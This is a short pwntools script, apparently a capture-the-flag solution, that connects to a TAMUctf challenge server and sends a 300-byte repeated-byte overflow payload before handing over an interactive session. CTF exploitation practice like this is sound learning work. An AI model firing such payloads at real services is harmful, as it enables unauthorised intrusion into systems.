from pwn import *

#r = process("./pwn1")
r = remote("pwn.tamuctf.com",4322)
pause()
r.sendline("\xd8"*300)
r.interactive()
